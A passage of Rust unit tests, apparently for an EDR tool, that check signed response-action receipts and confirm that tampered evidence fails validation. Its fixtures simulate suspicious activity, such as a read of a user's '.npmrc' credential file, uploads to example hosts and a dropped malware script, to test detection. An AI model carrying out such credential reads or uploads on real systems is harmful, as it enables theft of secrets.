                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                acknowledgement: &invalid_control_status_acknowledgement,
                graph: &subgraph,
            },
        );
        assert!(invalid_control_status_receipt
            .validate()
            .unwrap_err()
            .to_string()
            .contains("control acknowledgement status evidence"));

        let invalid_control_target_kind_acknowledgement =
            EndpointResponseAcknowledgementReport::from_execution(
                &execution,
                "operator:test",
                Some("invalid control acknowledgement target kind".to_string()),
                execution.completed_at + chrono::Duration::seconds(7),
            )
            .with_control_correlation(Some(EndpointResponseControlCorrelation {
                response_action_id: "11111111-1111-4111-8111-111111111111".to_string(),
                delivery_id: Some("22222222-2222-4222-8222-222222222222".to_string()),
                target_kind: "deployment".to_string(),
                target_id: "endpoint-1".to_string(),
                ack_token_hash: sha256(b"control-ack-token").to_hex_prefixed(),
                ack_status: "acknowledged".to_string(),
                resulting_state: Some("succeeded".to_string()),
            }));
        let invalid_control_target_kind_receipt =
            EndpointDecisionReceipt::for_response_acknowledgement(
                EndpointResponseAcknowledgementReceiptInput {
                    local_sequence: 138,
                    endpoint_id: "endpoint-1",
                    signer_identity: "local-edr:endpoint-1",
                    actor: response_actor("endpoint-1"),
                    policy: EndpointPolicySnapshot {
                        policy_version: "test-policy@1".to_string(),
                        policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                        policy_epoch: 7,
                    },
                    sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                    acknowledgement: &invalid_control_target_kind_acknowledgement,
                    graph: &subgraph,
                },
            );
        assert!(invalid_control_target_kind_receipt
            .validate()
            .unwrap_err()
            .to_string()
            .contains("control acknowledgement target kind evidence"));

        let mut mismatched_execution_id = receipt.clone();
        if let Some(execution_id_evidence) = mismatched_execution_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "executionId")
        {
            *execution_id_evidence =
                EndpointReceiptEvidence::hashed("executionId", "response_execution:other");
        }
        assert!(mismatched_execution_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement execution id evidence hash"));

        let mut missing_execution_id = receipt.clone();
        missing_execution_id
            .evidence
            .retain(|item| item.key != "executionId");
        assert!(missing_execution_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement execution id evidence"));

        let mut missing_acknowledged_status = receipt;
        missing_acknowledged_status
            .evidence
            .retain(|item| item.key != "acknowledgedStatus");
        assert!(missing_acknowledged_status
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement status evidence"));
    }

    #[test]
    fn endpoint_collect_evidence_acknowledgement_receipt_rejects_effects() {
        let event = observation(EndpointEvent::NetworkFlow {
            host: "ack-effect.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://ack-effect.example/upload".to_string()),
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::collect_evidence_execution(
            &process_node_id,
            &subgraph,
            600,
            "collect evidence graph slice",
        );
        let execution = EndpointResponseExecutionReport::collect_evidence(&plan, &subgraph)
            .unwrap_or_else(|err| panic!("failed to collect evidence report: {err}"));
        let acknowledgement = EndpointResponseAcknowledgementReport::from_execution(
            &execution,
            "operator:test",
            Some("reviewed collect evidence".to_string()),
            execution.completed_at + chrono::Duration::seconds(5),
        );
        let receipt = EndpointDecisionReceipt::for_response_acknowledgement(
            EndpointResponseAcknowledgementReceiptInput {
                local_sequence: 38,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                acknowledgement: &acknowledgement,
                graph: &subgraph,
            },
        );

        receipt.validate().unwrap();
        assert_eq!(
            receipt.decision.action,
            EndpointDecisionAction::CollectEvidence
        );
        assert!(!receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("acknowledgementEffect:")));

        let mut injected_effect = receipt;
        injected_effect
            .evidence
            .push(EndpointReceiptEvidence::hashed(
                "acknowledgementEffect:effect:fake",
                "collect_evidence:fake_effect",
            ));
        if let Some(effect_count_evidence) = injected_effect
            .evidence
            .iter_mut()
            .find(|item| item.key == "effectCount")
        {
            *effect_count_evidence = EndpointReceiptEvidence::hashed("effectCount", "1");
        }
        let response_action_id = response_action_id_from_signed_response_fields(
            injected_effect.graph.process_node_id.as_deref().unwrap(),
            injected_effect.graph.graph_slice_id.as_deref().unwrap(),
            &injected_effect.decision.action,
            injected_effect.decision.ttl_seconds.unwrap(),
        );
        let acknowledgement_id = response_acknowledgement_id_from_signed_evidence(
            &injected_effect.evidence,
            response_action_id.as_str(),
            injected_effect.decision.rollback_ref.as_deref().unwrap(),
            injected_effect.actor.agent_id.as_deref().unwrap(),
        )
        .unwrap();
        injected_effect.decision.finding_id = Some(acknowledgement_id.clone());
        if let Some(acknowledgement_id_evidence) = injected_effect
            .evidence
            .iter_mut()
            .find(|item| item.key == "acknowledgementId")
        {
            *acknowledgement_id_evidence =
                EndpointReceiptEvidence::hashed("acknowledgementId", acknowledgement_id);
        }
        assert!(injected_effect
            .validate()
            .unwrap_err()
            .to_string()
            .contains("collect evidence acknowledgement effect evidence"));
    }

    #[test]
    fn endpoint_response_acknowledgement_receipt_requires_effects_for_successful_non_collect() {
        let event = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Write,
            path: "/tmp/clawdstrike-ack-malware.sh".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let file_node_id = graph_recorder
            .graph()
            .nodes
            .values()
            .find(|node| node.kind == CausalNodeKind::File)
            .map(|node| node.node_id.clone())
            .unwrap_or_else(|| panic!("missing file node"));
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&file_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::quarantine_file_execution(
            &file_node_id,
            &subgraph,
            600,
            "quarantine suspicious file",
        );
        let execution = EndpointResponseExecutionReport::quarantine_file(
            &plan,
            &subgraph,
            "/tmp/clawdstrike-ack-malware.sh",
            "/tmp/clawdstrike-quarantine/clawdstrike-ack-malware.sh.quarantine",
            "0xabc123",
            128,
        )
        .unwrap_or_else(|err| panic!("failed to build quarantine execution report: {err}"));
        let acknowledgement = EndpointResponseAcknowledgementReport::from_execution(
            &execution,
            "operator:test",
            Some("reviewed quarantine".to_string()),
            execution.completed_at + chrono::Duration::seconds(5),
        );
        let receipt = EndpointDecisionReceipt::for_response_acknowledgement(
            EndpointResponseAcknowledgementReceiptInput {
                local_sequence: 39,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                acknowledgement: &acknowledgement,
                graph: &subgraph,
            },
        );

        receipt.validate().unwrap();
        assert_eq!(
            receipt.decision.action,
            EndpointDecisionAction::QuarantineFile
        );
        assert!(receipt.decision.passed);
        assert_eq!(acknowledgement.effects.len(), 1);
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("acknowledgementEffect:")));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("acknowledgementEffectType:")));

        let mut missing_effect_type = receipt.clone();
        missing_effect_type
            .evidence
            .retain(|item| !item.key.starts_with("acknowledgementEffectType:"));
        assert!(missing_effect_type
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement effect type evidence"));

        let mut mismatched_effect_type = receipt.clone();
        if let Some(effect_type_evidence) = mismatched_effect_type
            .evidence
            .iter_mut()
            .find(|item| item.key.starts_with("acknowledgementEffectType:"))
        {
            let key = effect_type_evidence.key.clone();
            *effect_type_evidence = EndpointReceiptEvidence::hashed(key, "disable_persistence");
        }
        assert!(mismatched_effect_type
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement effect type evidence hash"));

        let mut dropped_effect_evidence = receipt;
        dropped_effect_evidence
            .evidence
            .retain(|item| !item.key.starts_with("acknowledgementEffect:"));
        if let Some(effect_count_evidence) = dropped_effect_evidence
            .evidence
            .iter_mut()
            .find(|item| item.key == "effectCount")
        {
            *effect_count_evidence = EndpointReceiptEvidence::hashed("effectCount", "0");
        }
        assert!(dropped_effect_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement effect evidence"));
    }

    #[test]
    fn endpoint_response_acknowledgement_receipt_binds_effect_digest() {
        let event = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Write,
            path: "/tmp/clawdstrike-ack-effect-malware.sh".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let file_node_id = graph_recorder
            .graph()
            .nodes
            .values()
            .find(|node| node.kind == CausalNodeKind::File)
            .map(|node| node.node_id.clone())
            .unwrap_or_else(|| panic!("missing file node"));
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&file_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::quarantine_file_execution(
            &file_node_id,
            &subgraph,
            600,
            "quarantine suspicious file",
        );
        let execution = EndpointResponseExecutionReport::quarantine_file(
            &plan,
            &subgraph,
            "/tmp/clawdstrike-ack-effect-malware.sh",
            "/tmp/clawdstrike-quarantine/clawdstrike-ack-effect-malware.sh.quarantine",
            "0xabc123",
            128,
        )
        .unwrap_or_else(|err| panic!("failed to build quarantine execution report: {err}"));
        let acknowledgement = EndpointResponseAcknowledgementReport::from_execution(
            &execution,
            "operator:test",
            Some("reviewed quarantine effect".to_string()),
            execution.completed_at + chrono::Duration::seconds(5),
        );
        let receipt = EndpointDecisionReceipt::for_response_acknowledgement(
            EndpointResponseAcknowledgementReceiptInput {
                local_sequence: 40,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                acknowledgement: &acknowledgement,
                graph: &subgraph,
            },
        );

        receipt.validate().unwrap();
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("acknowledgementEffect:")));

        let mut substituted_effect = receipt;
        if let Some(effect_evidence) = substituted_effect
            .evidence
            .iter_mut()
            .find(|item| item.key.starts_with("acknowledgementEffect:"))
        {
            let effect_key = effect_evidence.key.clone();
            *effect_evidence = EndpointReceiptEvidence::hashed(effect_key, "quarantine_file:other");
        }
        assert!(substituted_effect
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement execution id evidence hash"));
    }

    #[test]
    fn endpoint_response_execution_expiration_receipt_binds_ttl_and_rollback() {
        let event = observation(EndpointEvent::NetworkFlow {
            host: "expire.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://expire.example/upload".to_string()),
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::collect_evidence_execution(
            &process_node_id,
            &subgraph,
            1,
            "collect evidence graph slice",
        );
        let execution = EndpointResponseExecutionReport::collect_evidence(&plan, &subgraph)
            .unwrap_or_else(|err| panic!("failed to collect evidence report: {err}"));
        let expired =
            EndpointResponseExecutionReport::expired_from(&execution, execution.expires_at());
        let keypair = hush_core::Keypair::from_seed(&[19u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 19,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                execution: &expired,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::ResponseExecution
        );
        assert_eq!(receipt.decision.finding_id, Some(expired.execution_id));
        assert_eq!(
            receipt.decision.action,
            EndpointDecisionAction::CollectEvidence
        );
        assert!(!receipt.decision.passed);
        assert_eq!(
            receipt.decision.rollback_ref.as_deref(),
            Some(plan.rollback_ref.as_str())
        );
        assert_eq!(receipt.decision.ttl_seconds, Some(1));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "executionStatus"));
    }

    #[test]
    fn endpoint_response_execution_cancellation_receipt_binds_reason_ttl_and_rollback() {
        let event = observation(EndpointEvent::NetworkFlow {
            host: "cancel.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://cancel.example/upload".to_string()),
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::collect_evidence_execution(
            &process_node_id,
            &subgraph,
            600,
            "collect evidence graph slice",
        );
        let execution = EndpointResponseExecutionReport::collect_evidence(&plan, &subgraph)
            .unwrap_or_else(|err| panic!("failed to collect evidence report: {err}"));
        let cancelled = EndpointResponseExecutionReport::cancelled_from(
            &execution,
            "operator closed the local response window",
            execution.completed_at + chrono::Duration::seconds(15),
        );
        let keypair = hush_core::Keypair::from_seed(&[23u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 23,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                execution: &cancelled,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::ResponseExecution
        );
        assert_eq!(receipt.decision.finding_id, Some(cancelled.execution_id));
        assert_eq!(
            receipt.decision.action,
            EndpointDecisionAction::CollectEvidence
        );
        assert!(!receipt.decision.passed);
        assert_eq!(
            receipt.decision.rollback_ref.as_deref(),
            Some(plan.rollback_ref.as_str())
        );
        assert_eq!(receipt.decision.ttl_seconds, Some(600));
        assert_eq!(
            receipt.decision.title.as_deref(),
            Some("Endpoint response action cancelled")
        );
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "executionStatus"));
        assert!(receipt.evidence.iter().any(|item| item.key == "reason"));

        let mut relabeled_cancellation_id = receipt.clone();
        relabeled_cancellation_id.decision.finding_id =
            Some("response_execution_cancelled:other".to_string());
        if let Some(execution_id_evidence) = relabeled_cancellation_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "executionId")
        {
            *execution_id_evidence = EndpointReceiptEvidence::hashed(
                "executionId",
                "response_execution_cancelled:other",
            );
        }
        assert!(relabeled_cancellation_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution id evidence hash"));
    }

    #[test]
    fn endpoint_graph_slice_receipt_binds_exported_subgraph() {
        let event = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/.npmrc".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let keypair = hush_core::Keypair::from_seed(&[17u8; 32]);
        let mut receipt =
            EndpointDecisionReceipt::for_graph_slice(EndpointGraphSliceReceiptInput {
                local_sequence: 16,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                root_node_id: &process_node_id,
                slice_kind: "causal_subgraph",
                graph: &subgraph,
            });
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::GraphSlice
        );
        assert_eq!(
            receipt.decision.finding_id.as_deref(),
            receipt.graph.graph_slice_id.as_deref()
        );
        assert_eq!(
            receipt.graph.process_node_id.as_deref(),
            Some(process_node_id.as_str())
        );
        assert!(receipt.evidence.iter().any(|item| item.key == "sliceKind"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "contentHash"));

        let mut mismatched_content_hash = receipt.clone();
        if let Some(content_hash_evidence) = mismatched_content_hash
            .evidence
            .iter_mut()
            .find(|item| item.key == "contentHash")
        {
            *content_hash_evidence = EndpointReceiptEvidence::hashed("contentHash", "sha256:other");
        }
        assert!(mismatched_content_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("graph slice content hash evidence hash"));

        let mut mismatched_root_evidence = receipt.clone();
        if let Some(root_node_evidence) = mismatched_root_evidence
            .evidence
            .iter_mut()
            .find(|item| item.key == "rootNodeId")
        {
            *root_node_evidence = EndpointReceiptEvidence::hashed("rootNodeId", "node:other");
        }
        assert!(mismatched_root_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("graph slice root node evidence hash"));

        let mut mismatched_node_count = receipt.clone();
        if let Some(node_count_evidence) = mismatched_node_count
            .evidence
            .iter_mut()
            .find(|item| item.key == "nodeCount")
        {
            *node_count_evidence = EndpointReceiptEvidence::hashed("nodeCount", "0");
        }
        assert!(mismatched_node_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("graph slice node count evidence hash"));

        let mut mismatched_root_reference = receipt.clone();
        mismatched_root_reference.graph.process_node_id = Some("node:other".to_string());
        if let Some(root_node_evidence) = mismatched_root_reference
            .evidence
            .iter_mut()
            .find(|item| item.key == "rootNodeId")
        {
            *root_node_evidence = EndpointReceiptEvidence::hashed("rootNodeId", "node:other");
        }
        assert!(mismatched_root_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("graph slice graph root reference"));

        let mut mismatched_graph_slice_reference = receipt.clone();
        mismatched_graph_slice_reference.graph.graph_slice_id =
            Some("graph_slice:other".to_string());
        if let Some(graph_slice_evidence) = mismatched_graph_slice_reference
            .evidence
            .iter_mut()
            .find(|item| item.key == "graphSliceId")
        {
            *graph_slice_evidence =
                EndpointReceiptEvidence::hashed("graphSliceId", "graph_slice:other");
        }
        assert!(mismatched_graph_slice_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("graph slice graph slice reference"));
    }

    #[test]
    fn endpoint_policy_delta_receipt_binds_delta_artifact_and_graph() {
        let keypair = hush_core::Keypair::from_seed(&[31u8; 32]);
        let artifact_hash = sha256(b"policy-delta-artifact").to_hex_prefixed();
        let action = EndpointDecisionAction::Warn;
        let generated_at = "2026-05-17T12:00:00Z";
        let source_affected_identity_context = r#"[{"identityKind":"user","sourceNodeId":"node:user:alice","sourceNodeKind":"user","value":"alice"}]"#;
        let source_affected_tool_context = r#"[{"sourceNodeId":"node:tool:mcp.shell","toolCallId":"tool-call-1","toolName":"mcp.shell"}]"#;
        let policy_delta_id = endpoint_policy_delta_id(EndpointPolicyDeltaIdInput {
            endpoint_id: "endpoint-1",
            rule_id: "endpoint.policy_delta.test",
            action: &action,
            staged_detection_id: "staged_detection:test",
            stage: "audit",
            generated_at,
            simulation_id: "simulation:test",
            graph_slice_id: "graph_slice:test",
            root_node_id: "node:test",
            source_affected_identity_context,
            source_affected_tool_context,
        });
        let mut receipt =
            EndpointDecisionReceipt::for_policy_delta(EndpointPolicyDeltaReceiptInput {
                local_sequence: 31,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                operation: "generated",
                policy_delta_id: policy_delta_id.as_str(),
                staged_detection_id: "staged_detection:test",
                rule_id: "endpoint.policy_delta.test",
                stage: "audit",
                generated_at,
                action,
                artifact_hash: artifact_hash.as_str(),
                simulation_id: "simulation:test",
                graph_slice_id: "graph_slice:test",
                root_node_id: "node:test",
                source_affected_identity_context,
                source_affected_tool_context,
                cross_window_impact_hash: None,
                cross_window_recommendation_hash: None,
                previous_policy_hash: None,
                new_policy_hash: None,
                backup_path: None,
            });
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::PolicyDelta
        );
        assert_eq!(
            receipt.decision.finding_id.as_deref(),
            Some(policy_delta_id.as_str())
        );

        let terminate_delta_id = endpoint_policy_delta_id(EndpointPolicyDeltaIdInput {
            endpoint_id: "endpoint-1",
            rule_id: "endpoint.policy_delta.terminate",
            action: &EndpointDecisionAction::TerminateProcessTree,
            staged_detection_id: "staged_detection:terminate",
            stage: "limited_block",
            generated_at,
            simulation_id: "simulation:terminate",
            graph_slice_id: "graph_slice:terminate",
            root_node_id: "node:terminate",
            source_affected_identity_context,
            source_affected_tool_context,
        });
        let terminate_receipt =
            EndpointDecisionReceipt::for_policy_delta(EndpointPolicyDeltaReceiptInput {
                local_sequence: 32,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                operation: "generated",
                policy_delta_id: terminate_delta_id.as_str(),
                staged_detection_id: "staged_detection:terminate",
                rule_id: "endpoint.policy_delta.terminate",
                stage: "limited_block",
                generated_at,
                action: EndpointDecisionAction::TerminateProcessTree,
                artifact_hash: artifact_hash.as_str(),
                simulation_id: "simulation:terminate",
                graph_slice_id: "graph_slice:terminate",
                root_node_id: "node:terminate",
                source_affected_identity_context,
                source_affected_tool_context,
                cross_window_impact_hash: None,
                cross_window_recommendation_hash: None,
                previous_policy_hash: None,
                new_policy_hash: None,
                backup_path: None,
            });
        assert!(terminate_receipt
            .validate()
            .unwrap_err()
            .to_string()
            .contains("rollback-capable policy action"));

        let mut mismatched_delta_id = receipt.clone();
        if let Some(delta_id_evidence) = mismatched_delta_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "policyDeltaId")
        {
            *delta_id_evidence =
                EndpointReceiptEvidence::hashed("policyDeltaId", "policy_delta:other");
        }
        assert!(mismatched_delta_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy delta id evidence hash"));

        let mut relabeled_delta_id = receipt.clone();
        relabeled_delta_id.decision.finding_id = Some("policy_delta:other".to_string());
        if let Some(delta_id_evidence) = relabeled_delta_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "policyDeltaId")
        {
            *delta_id_evidence =
                EndpointReceiptEvidence::hashed("policyDeltaId", "policy_delta:other");
        }
        assert!(relabeled_delta_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy delta id"));

        let mut relabeled_generated_as_applied = receipt.clone();
        relabeled_generated_as_applied.decision.title =
            Some("Endpoint staged policy delta applied".to_string());
        if let Some(operation_evidence) = relabeled_generated_as_applied
            .evidence
            .iter_mut()
            .find(|item| item.key == "operation")
        {
            *operation_evidence = EndpointReceiptEvidence::hashed("operation", "applied");
        }
        assert!(relabeled_generated_as_applied
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy delta applied"));

        let mut missing_artifact_hash = receipt.clone();
        missing_artifact_hash
            .evidence
            .retain(|item| item.key != "artifactHash");
        assert!(missing_artifact_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy delta artifact hash evidence"));

        let mut missing_source_identity_context = receipt.clone();
        missing_source_identity_context
            .evidence
            .retain(|item| item.key != "sourceAffectedIdentityContext");
        assert!(missing_source_identity_context
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy delta source affected identity context evidence"));

        let mut relabeled_source_tool_context = receipt.clone();
        if let Some(tool_context_evidence) = relabeled_source_tool_context
            .evidence
            .iter_mut()
            .find(|item| item.key == "sourceAffectedToolContext")
        {
            *tool_context_evidence =
                EndpointReceiptEvidence::hashed("sourceAffectedToolContext", "[]");
        }
        assert!(relabeled_source_tool_context
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy delta id"));

        let mut mismatched_graph_slice = receipt.clone();
        if let Some(graph_slice_evidence) = mismatched_graph_slice
            .evidence
            .iter_mut()
            .find(|item| item.key == "graphSliceId")
        {
            *graph_slice_evidence =
                EndpointReceiptEvidence::hashed("graphSliceId", "graph_slice:other");
        }
        assert!(mismatched_graph_slice
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy delta graph slice evidence hash"));

        let mut mismatched_root_reference = receipt.clone();
        mismatched_root_reference.graph.process_node_id = Some("node:other".to_string());
        if let Some(root_node_evidence) = mismatched_root_reference
            .evidence
            .iter_mut()
            .find(|item| item.key == "rootNodeId")
        {
            *root_node_evidence = EndpointReceiptEvidence::hashed("rootNodeId", "node:other");
        }
        assert!(mismatched_root_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy delta root node reference"));
    }

    #[test]
    fn endpoint_evidence_bundle_manifest_receipt_binds_graph_slice_hash() {
        let event = observation(EndpointEvent::NetworkFlow {
            host: "bundle.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://bundle.example/upload".to_string()),
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::collect_evidence_execution(
            &process_node_id,
            &subgraph,
            600,
            "collect evidence graph slice",
        );
        let execution = EndpointResponseExecutionReport::collect_evidence(&plan, &subgraph)
            .unwrap_or_else(|err| panic!("failed to collect evidence report: {err}"));
        let keypair = hush_core::Keypair::from_seed(&[16u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_evidence_bundle_manifest(
            EndpointEvidenceBundleManifestReceiptInput {
                local_sequence: 15,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                root_node_id: &process_node_id,
                bundle: &execution.evidence_bundle,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::EvidenceBundleManifest
        );
        assert_eq!(
            receipt.decision.finding_id.as_deref(),
            Some(execution.evidence_bundle.bundle_id.as_str())
        );
        assert_eq!(
            receipt.graph.process_node_id.as_deref(),
            Some(process_node_id.as_str())
        );
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "contentHash"));

        let mut mismatched_bundle_id = receipt.clone();
        if let Some(bundle_id_evidence) = mismatched_bundle_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "evidenceBundleId")
        {
            *bundle_id_evidence =
                EndpointReceiptEvidence::hashed("evidenceBundleId", "evidence_bundle:other");
        }
        assert!(mismatched_bundle_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("evidence bundle id evidence hash"));

        let mut mismatched_node_count = receipt.clone();
        if let Some(node_count_evidence) = mismatched_node_count
            .evidence
            .iter_mut()
            .find(|item| item.key == "nodeCount")
        {
            *node_count_evidence = EndpointReceiptEvidence::hashed("nodeCount", "0");
        }
        assert!(mismatched_node_count
            .validate()
            .unwrap_err()
            .to_string()
